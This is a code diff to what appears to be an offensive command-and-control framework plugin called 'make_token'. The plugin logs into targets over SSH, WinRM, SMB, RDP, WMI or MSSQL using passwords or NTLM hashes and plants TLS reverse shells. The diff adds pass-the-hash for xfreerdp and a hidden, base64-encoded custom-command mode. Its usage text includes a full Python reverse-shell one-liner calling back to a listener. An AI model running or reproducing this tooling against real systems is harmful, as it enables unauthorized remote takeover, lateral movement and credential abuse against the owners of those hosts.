@@ -10,11 +10,79 @@ import os
 import subprocess
 import shutil
 import time
+import base64
 from abc import ABC, abstractmethod
 from typing import Dict, Optional, Tuple, Any, List, Union
 
 from ..api import plugin, SessionContext
 
+MAKE_TOKEN_USAGE = """
+make_token — Establish a C2 session via SSH, WinRM, SMB, RDP, WMI, or MSSQL,
+and deliver a reverse shell payload (TLS) or a custom command.
+
+Usage:
+  run make_token -x <protocol> --os <os> -i <ip> -u <username> -p <password> -rh <host> -rp <port>
+  run make_token -x <protocol> --os <os> -i <ip> -u <username> -H <hash> --nxc -rh <host> -rp <port>
+  run make_token -x ssh --os linux -i <ip> -u <username> -c <keyfile> -rh <host> -rp <port>
+  run make_token -x <protocol> --os <os> -i <ip> -u <username> -p <password> -C "<custom command>"
+
+Protocols & authentication:
+  ssh        - password (-p) or private key (-c); supports Linux and Windows (with --nxc)
+  winrm      - password (-p) or NTLM hash (-H); Windows only
+  smb        - password (-p) or NTLM hash (-H); Windows (psexec) or Linux (--nxc)
+  rdp        - password (-p) or NTLM hash (-H); supports both --nxc and xfreerdp (xfreerdp uses /pth:)
+  wmi        - password (-p) or NTLM hash (-H); Windows only
+  mssql      - password (-p) or NTLM hash (-H); Windows only (enables xp_cmdshell)
+
+Options:
+  -x, --protocol <proto>     Protocol to use (ssh, winrm, smb, rdp, wmi, mssql)
+  --os <os>                  Target OS: windows, linux, unix (linux and unix share the same payload)
+  -i, --ip <ip>              Target IP address
+  -P, --port <port>          Custom port (defaults: ssh:22, winrm:5985, smb:445, rdp:3389, wmi:135, mssql:1433)
+  -u, --username <user>      Username for authentication
+  -p, --password <pass>      Password (use with -p, or -p for ssh)
+  -c, --key <path>           SSH private key file (SSH only)
+  -H, --hash <ntlm_hash>     NTLM hash (SMB, RDP, WinRM, WMI, MSSQL)
+  --nxc                      Use netexec (nxc) instead of native tools (recommended for Linux targets)
+  -rh, --callback-host <ip>  Reverse shell listener host (required unless -C is given)
+  -rp, --callback-port <port>  Reverse shell listener TLS port (required unless -C is given)
+  -C, --custom-payload <cmd>  Execute any custom command instead of the built‑in reverse shell.
+                              The command is base64‑encoded and backgrounded automatically,
+                              so no quoting/escaping is needed – just pass the raw command.
+                              When -C is given, -rh and -rp are not required.
+
+Built‑in payloads (when -C is not used):
+  Windows:     PowerShell TLS reverse shell over SSL (encrypted)
+  Linux/Unix:  OpenSSL reverse shell over TLS (requires openssl on target)
+
+Examples:
+  # Reverse shell via SSH to Linux
+  run make_token -x ssh --os linux -i 192.168.1.10 -u root -p secret -rh 10.0.0.5 -rp 4444
+
+  # Reverse shell via WinRM to Windows using NTLM hash
+  run make_token -x winrm --os windows -i 192.168.1.20 -u admin -H aad3b435b51404eeaad3b435b51404ee:1234567890abcdef --nxc -rh 10.0.0.5 -rp 4444
+
+  # Custom command (create directory, backgrounded)
+  run make_token -x ssh --os linux -i 192.168.1.10 -u root -p secret -C "mkdir /tmp/hello"
+
+  # Custom reverse shell with environment variables (no manual quoting needed)
+  run make_token -x ssh --os linux -i 192.168.1.10 -u root -p secret -C export RHOST=10.0.0.5;export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+
+  # SMB to Windows with psexec (no --nxc)
+  run make_token -x smb --os windows -i 192.168.1.30 -u admin -p pass -rh 10.0.0.5 -rp 4444
+
+  # RDP to Windows with xfreerdp (headless environments require --nxc)
+  run make_token -x rdp --os windows -i 192.168.1.40 -u user -p pass --nxc -rh 10.0.0.5 -rp 4444
+
+Notes:
+  - If -C is given, the custom command is base64‑encoded and executed with nohup (Linux) or Start‑Process (Windows),
+    so it runs in the background and does not block the session.
+  - For Linux custom commands, ensure the target has base64, sh, and the necessary interpreters.
+  - For Windows custom commands, PowerShell will be used to decode and execute.
+  - Platform detection is informational only; the payload is chosen based on --os.
+""".strip()
+
+PLUGIN_INFO = MAKE_TOKEN_USAGE
 
 class RemoteTransportError(Exception):
     """Base exception for remote transport errors."""
@@ -125,7 +193,7 @@ class SSHTransport(RemoteTransport):
         self._plink_available = False
         self._use_sshpass = False
         self._use_plink = False
-        self._hostkey = None  # store host key for Plink (without hostname)
+        self._hostkey = None
 
     def _ensure_dependency(self):
         has_ssh = self._check_command('ssh')
@@ -150,7 +218,6 @@ class SSHTransport(RemoteTransport):
         'keytype base64key' format (without the hostname), which Plink accepts.
         """
         try:
-            # Try each key type in order of preference
             for key_type in ['rsa', 'ecdsa', 'ed25519', 'dsa']:
                 cmd = ['ssh-keyscan', '-t', key_type, '-p', str(port), host]
                 success, stdout, stderr = self._run_command(cmd, timeout=10)
@@ -158,17 +225,13 @@ class SSHTransport(RemoteTransport):
                     lines = stdout.splitlines()
                     for line in lines:
                         line = line.strip()
-                        # Skip comments and empty lines
                         if line and not line.startswith('#'):
-                            # Ensure it contains a valid key type
                             if any(keyword in line for keyword in ['ssh-rsa', 'ssh-dss', 'ecdsa-sha2', 'ssh-ed25519']):
-                                # Split and take only the keytype and key (drop hostname)
                                 parts = line.split()
-                                if len(parts) >= 3:  # host keytype key
+                                if len(parts) >= 3:
                                     return f"{parts[1]} {parts[2]}"
-                                elif len(parts) >= 2:  # keytype key (already without hostname)
+                                elif len(parts) >= 2:
                                     return f"{parts[0]} {parts[1]}"
-            # Fallback: try without specifying type
             cmd = ['ssh-keyscan', '-p', str(port), host]
             success, stdout, stderr = self._run_command(cmd, timeout=10)
             if success and stdout.strip():
@@ -208,7 +271,7 @@ class SSHTransport(RemoteTransport):
         base.extend(['-o', 'UserKnownHostsFile=/dev/null'])
         base.extend(['-o', 'LogLevel=quiet'])
         base.extend(['-o', 'ConnectTimeout=10'])
-        base.extend(['-T'])  # Disable TTY allocation for stable non‑interactive execution
+        base.extend(['-T'])
         if with_batch is None:
             with_batch = not self._use_sshpass
         if with_batch:
@@ -218,7 +281,6 @@ class SSHTransport(RemoteTransport):
         base.extend(['-p', str(self._port)])
         if self._private_key:
             base.extend(['-i', self._private_key])
-        # NOTE: -f (background) is NOT used; payload backgrounds itself.
         base.append(f"{self._username}@{self._host}")
         base.append(command)
         if self._use_sshpass and self._password:
@@ -247,11 +309,9 @@ class SSHTransport(RemoteTransport):
         self._use_nxc = use_nxc
         self._hostkey = None
 
-        # netexec mode – untouched
         if use_nxc:
             return self._connect_nxc(host, username, password, private_key_path, port)
 
-        # Private key authentication – use OpenSSH directly
         if private_key_path:
             if not os.path.exists(private_key_path):
                 raise RemoteTransportError(f"Private key file not found: {private_key_path}")
@@ -259,17 +319,14 @@ class SSHTransport(RemoteTransport):
                 raise RemoteTransportError(f"Private key file not readable: {private_key_path}")
             self._use_sshpass = False
             self._use_plink = False
-        # Password authentication – prefer Plink, but fallback to sshpass if Plink fails
         elif password:
             if self._plink_available:
-                # Try to get host key for Plink
                 hostkey = self._get_host_key(host, port)
                 if hostkey:
                     self._hostkey = hostkey
                     self._use_plink = True
                     self._use_sshpass = False
                 else:
-                    # If we can't fetch a host key, fallback to sshpass
                     if self._sshpass_available:
                         self._use_sshpass = True
                         self._use_plink = False
@@ -289,7 +346,6 @@ class SSHTransport(RemoteTransport):
         else:
             raise RemoteTransportError("SSH requires either password or private key")
 
-        # Test connection – if using Plink and it fails, fallback to sshpass
         if self._use_plink:
             cmd = self._build_plink_cmd("echo PLINK_CONNECTION_SUCCESS")
             success, stdout, stderr = self._run_command(cmd, timeout=15)
@@ -297,11 +353,9 @@ class SSHTransport(RemoteTransport):
                 self.connected = True
                 return True
             else:
-                # Plink failed – fallback to sshpass if available
                 if self._sshpass_available:
                     self._use_plink = False
                     self._use_sshpass = True
-                    # Retry with OpenSSH
                     cmd = self._build_ssh_cmd("echo SSH_CONNECTION_SUCCESS", with_batch=False)
                     success, stdout, stderr = self._run_command(cmd, timeout=15)
                     if success and 'SSH_CONNECTION_SUCCESS' in stdout:
@@ -314,7 +368,6 @@ class SSHTransport(RemoteTransport):
                     error_msg = stderr.strip() if stderr else stdout.strip()
                     raise RemoteTransportError(f"Plink connection test failed: {error_msg}")
         else:
-            # OpenSSH + sshpass test
             cmd = self._build_ssh_cmd("echo SSH_CONNECTION_SUCCESS", with_batch=False)
             success, stdout, stderr = self._run_command(cmd, timeout=15)
             if success and 'SSH_CONNECTION_SUCCESS' in stdout:
@@ -365,7 +418,6 @@ class SSHTransport(RemoteTransport):
             if command is None:
                 return False, f"No command found for OS: {target_os}"
 
-        # netexec mode – untouched
         if self._use_nxc:
             try:
                 cmd = ['netexec', 'ssh', self._host, '-u', self._username]
@@ -387,7 +439,6 @@ class SSHTransport(RemoteTransport):
             except Exception as e:
                 return False, str(e)
 
-        # Use Plink if preferred
         if self._use_plink:
             try:
                 cmd = self._build_plink_cmd(command)
@@ -400,7 +451,6 @@ class SSHTransport(RemoteTransport):
             except Exception as e:
                 return False, str(e)
         else:
-            # Fallback to OpenSSH + sshpass
             try:
                 cmd = self._build_ssh_cmd(command, background=background)
                 timeout = 10 if background else 60
@@ -413,7 +463,6 @@ class SSHTransport(RemoteTransport):
                 return False, str(e)
 
     def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
-        # Payload already backgrounds itself, so we don't set background=True.
         return self.execute_command(payload, target_os, background=False)
 
     def close(self):
@@ -430,7 +479,6 @@ class SSHTransport(RemoteTransport):
             return "unknown"
 
         if self._use_nxc:
-            # netexec detection – untouched
             try:
                 cmd = ['netexec', 'ssh', self._host, '-u', self._username]
                 if self._password:
@@ -456,7 +504,6 @@ class SSHTransport(RemoteTransport):
             except Exception:
                 return "unknown"
 
-        # Use Plink or OpenSSH for detection
         try:
             if self._use_plink:
                 cmd = self._build_plink_cmd('uname -s 2>/dev/null || echo Windows')
@@ -468,7 +515,6 @@ class SSHTransport(RemoteTransport):
                     return "linux"
                 elif 'Windows' in stdout or 'CYGWIN' in stdout or 'MSYS' in stdout:
                     return "windows"
-            # Fallback: try 'ver' command for Windows
             if self._use_plink:
                 cmd = self._build_plink_cmd('ver 2>nul || echo Linux')
             else:
@@ -898,7 +944,6 @@ class RDPTransport(RemoteTransport):
                 self._xfreerdp_command,
                 '/v:' + host_spec,
                 '/u:' + username,
-                '/p:' + password,
                 '/cert-ignore',
                 '/timeout:10000',
                 '/network:lan',
@@ -906,6 +951,12 @@ class RDPTransport(RemoteTransport):
                 '/gdi:sw',
                 '/exit-after-disconnect',
             ]
+            if ntlm_hash:
+                cmd.extend(['/pth:' + ntlm_hash])
+            elif password:
+                cmd.extend(['/p:' + password])
+            else:
+                raise RemoteTransportError("Password or NTLM hash required for xfreerdp")
             success, stdout, stderr = self._run_command(cmd, timeout=10)
             if success:
                 self.connected = True
@@ -939,7 +990,6 @@ class RDPTransport(RemoteTransport):
             self._xfreerdp_command,
             '/v:' + self._host,
             '/u:' + self._username,
-            '/p:' + self._password,
             '/cert-ignore',
             '/timeout:10000',
             '/network:lan',
@@ -949,6 +999,12 @@ class RDPTransport(RemoteTransport):
             '/app-cmd:' + f'/c {command}',
             '/exit-after-disconnect',
         ]
+        if ntlm_hash:
+            cmd.extend(['/pth:' + ntlm_hash])
+        elif password:
+            cmd.extend(['/p:' + password])
+        else:
+            raise RemoteTransportError("Password or NTLM hash required for xfreerdp")
         if self._port is not None and self._port != self.DEFAULT_PORTS['rdp']:
             cmd.append('/port:' + str(self._port))
 
@@ -1484,7 +1540,7 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
                         choices=['ssh', 'winrm', 'smb', 'rdp', 'wmi', 'mssql'],
                         help='Remote protocol to use')
     parser.add_argument('--os', required=True,
-                        choices=['windows', 'linux', 'macos'],
+                        choices=['windows', 'linux', 'unix'],
                         help='Target operating system')
     parser.add_argument('-i', '--ip', required=True, help='Target IP address')
     parser.add_argument('-P', '--port', type=int, help='Custom port number (default: protocol default)')
@@ -1493,13 +1549,34 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
     parser.add_argument('-c', '--key', help='SSH private key path (SSH only)')
     parser.add_argument('-H', '--hash', help='NTLM hash for authentication (SMB/RDP/WinRM)')
     parser.add_argument('--nxc', action='store_true', help='Use netexec tool instead of native protocol tools')
-    parser.add_argument('-rh', '--callback-host', required=True,
-                        help='Reverse shell listener host (TLS)')
-    parser.add_argument('-rp', '--callback-port', required=True, type=int,
-                        help='Reverse shell listener TLS port')
+    parser.add_argument('-rh', '--callback-host', 
+                        help='Reverse shell listener host (TLS) – required unless --custom-payload is used')
+    parser.add_argument('-rp', '--callback-port', type=int,
+                        help='Reverse shell listener TLS port – required unless --custom-payload is used')
+    parser.add_argument('-C', '--custom-payload', nargs=argparse.REMAINDER,
+                        help='Custom command to execute instead of the built-in reverse shell. '
+                            'All remaining arguments are treated as the command. '
+                            'When provided, -rh and -rp are not required.')
 
     try:
         parsed = parser.parse_args(args)
+
+        custom_payload_list = parsed.custom_payload
+        if custom_payload_list is not None:
+            if not custom_payload_list:
+                raise RemoteTransportError("Custom payload cannot be empty.")
+            custom_payload = ' '.join(custom_payload_list)
+        else:
+            custom_payload = None
+
+        if not custom_payload:
+            if parsed.callback_host is None or parsed.callback_port is None:
+                raise RemoteTransportError(
+                    "When --custom-payload is not provided, both -rh and -rp are required."
+                )
+        else:
+            parsed.callback_host = parsed.callback_host or "custom"
+            parsed.callback_port = parsed.callback_port or 0
 
         if parsed.port and (parsed.port < 1 or parsed.port > 65535):
             raise RemoteTransportError("Port must be between 1 and 65535")
@@ -1563,6 +1640,7 @@ def parse_make_token_args(args: list) -> Dict[str, Any]:
             'use_nxc': parsed.nxc,
             'callback_host': parsed.callback_host,
             'callback_port': parsed.callback_port,
+            'custom_payload': custom_payload,
         }
     except SystemExit:
         raise RemoteTransportError("Invalid arguments. See --help for usage.")
@@ -1599,6 +1677,9 @@ def format_make_token_report(data: Dict) -> str:
     description='Establish C2 session via remote protocol and deliver reverse shell payload (TLS)',
 )
 def run(session: SessionContext, args):
+    if not args or any(a in args for a in ('-h', '--help')):
+        session.print(MAKE_TOKEN_USAGE)
+        return 0
     session.log_event('make_token: execution started')
 
     try:
@@ -1619,6 +1700,7 @@ def run(session: SessionContext, args):
     use_nxc = params['use_nxc']
     callback_host = params['callback_host']
     callback_port = params['callback_port']
+    custom_payload = params.get('custom_payload')
 
     tool_info = ""
     if use_nxc:
@@ -1666,9 +1748,12 @@ def run(session: SessionContext, args):
             'username': username,
             'status': 'failed',
             'error': str(e),
-            'callback_host': callback_host,
-            'callback_port': callback_port,
         }
+        if custom_payload:
+            result['custom_payload'] = custom_payload
+        else:
+            result['callback_host'] = callback_host
+            result['callback_port'] = callback_port
         if ntlm_hash:
             result['auth_method'] = 'NTLM hash'
         elif key:
@@ -1681,11 +1766,13 @@ def run(session: SessionContext, args):
         return 1
 
     try:
+        target_platform = params['os']
+
         detected_platform = transport.detect_platform()
         if detected_platform != "unknown":
-            target_platform = detected_platform if detected_platform in ['windows', 'linux'] else target_os
+            session.print(f"Detected platform (informational): {detected_platform}", 'cyan')
         else:
-            target_platform = target_os
+            session.print("Platform detection returned unknown, using --os value.", 'yellow')
         session.print(f"Target platform: {target_platform}", 'cyan')
     except Exception as e:
         transport.close()
@@ -1695,9 +1782,12 @@ def run(session: SessionContext, args):
             'username': username,
             'status': 'failed',
             'error': f'Platform detection failed: {e}',
-            'callback_host': callback_host,
-            'callback_port': callback_port,
         }
+        if custom_payload:
+            result['custom_payload'] = custom_payload
+        else:
+            result['callback_host'] = callback_host
+            result['callback_port'] = callback_port
         session.print(format_make_token_report(result), 'red')
         session.log_plugin_result('make_token', format_make_token_report(result), str(e))
         return 1
@@ -1712,68 +1802,82 @@ def run(session: SessionContext, args):
             'platform': target_platform,
             'status': 'failed',
             'error': error_msg,
-            'callback_host': callback_host,
-            'callback_port': callback_port,
         }
+        if custom_payload:
+            result['custom_payload'] = custom_payload
+        else:
+            result['callback_host'] = callback_host
+            result['callback_port'] = callback_port
         session.print(format_make_token_report(result), 'red')
         session.log_plugin_result('make_token', format_make_token_report(result), error_msg)
         return 1
 
-    session.print(f"Generating reverse shell payload for {target_platform} (TLS to {callback_host}:{callback_port})...", 'yellow')
-    try:
+    if custom_payload:
+        if target_platform in ('linux', 'unix'):
+            encoded = base64.b64encode(custom_payload.encode()).decode()
+            prepared_payload = f"nohup sh -c \"echo '{encoded}' | base64 -d | sh\" >/dev/null 2>&1 &"
+        elif target_platform == 'windows':
+            encoded = base64.b64encode(custom_payload.encode('utf-16le')).decode()
+            prepared_payload = (
+                f"powershell -Command "
+                f"\"Start-Process -WindowStyle Hidden -FilePath powershell -ArgumentList '-EncodedCommand {encoded}'\""
+            )
+        else:
+            prepared_payload = custom_payload
+
+        session.print(f"Executing custom payload (backgrounded): {custom_payload}", 'yellow')
+        success, output = transport.execute_command(prepared_payload, target_platform, background=True)
+    else:
+        session.print(f"Generating reverse shell payload for {target_platform} (TLS to {callback_host}:{callback_port})...", 'yellow')
         payload = transport._generate_payload(target_platform, callback_host, callback_port)
         session.print("Delivering payload in background...", 'yellow')
         success, output = transport.deliver_payload(payload, target_platform)
-        if success:
-            session.print("Payload delivered successfully! Reverse shell should connect back shortly.", 'green')
-            result = {
-                'protocol': protocol,
-                'ip': ip,
-                'username': username,
-                'platform': target_platform,
-                'status': 'success',
-                'message': 'Reverse shell payload delivered (background)',
-                'callback_host': callback_host,
-                'callback_port': callback_port,
-            }
-            if use_nxc:
-                result['tool'] = 'netexec (nxc)'
-            elif protocol == 'winrm' and not use_nxc:
-                result['tool'] = 'evil-winrm' if transport._evil_winrm_available else 'netexec'
-            if ntlm_hash:
-                result['auth_method'] = 'NTLM hash'
-            elif key:
-                result['auth_method'] = 'SSH key'
-            elif password:
-                result['auth_method'] = 'password'
-            session.print(format_make_token_report(result), 'green')
-            session.log_plugin_result('make_token', format_make_token_report(result), 'success')
+
+
+    if success:
+        session.print("Payload delivered successfully! Reverse shell should connect back shortly.", 'green')
+        result = {
+            'protocol': protocol,
+            'ip': ip,
+            'username': username,
+            'platform': target_platform,
+            'status': 'success',
+        }
+        if custom_payload:
+            result['message'] = 'Custom payload executed'
+            result['custom_payload'] = custom_payload
         else:
-            result = {
-                'protocol': protocol,
-                'ip': ip,
-                'username': username,
-                'platform': target_platform,
-                'status': 'failed',
-                'error': f'Payload execution failed: {output}',
-                'callback_host': callback_host,
-                'callback_port': callback_port,
-            }
-            session.print(format_make_token_report(result), 'red')
-            session.log_plugin_result('make_token', format_make_token_report(result), output)
-    except Exception as e:
+            result['message'] = 'Reverse shell payload delivered (background)'
+            result['callback_host'] = callback_host
+            result['callback_port'] = callback_port
+        if use_nxc:
+            result['tool'] = 'netexec (nxc)'
+        elif protocol == 'winrm' and not use_nxc:
+            result['tool'] = 'evil-winrm' if transport._evil_winrm_available else 'netexec'
+        if ntlm_hash:
+            result['auth_method'] = 'NTLM hash'
+        elif key:
+            result['auth_method'] = 'SSH key'
+        elif password:
+            result['auth_method'] = 'password'
+        session.print(format_make_token_report(result), 'green')
+        session.log_plugin_result('make_token', format_make_token_report(result), 'success')
+    else:
         result = {
             'protocol': protocol,
             'ip': ip,
             'username': username,
             'platform': target_platform,
             'status': 'failed',
-            'error': f'Payload delivery error: {e}',
-            'callback_host': callback_host,
-            'callback_port': callback_port,
+            'error': f'Payload execution failed: {output}',
         }
+        if custom_payload:
+            result['custom_payload'] = custom_payload
+        else:
+            result['callback_host'] = callback_host
+            result['callback_port'] = callback_port
         session.print(format_make_token_report(result), 'red')
-        session.log_plugin_result('make_token', format_make_token_report(result), str(e))
+        session.log_plugin_result('make_token', format_make_token_report(result), output)
 
     transport.close()
     return 0 if success else 1
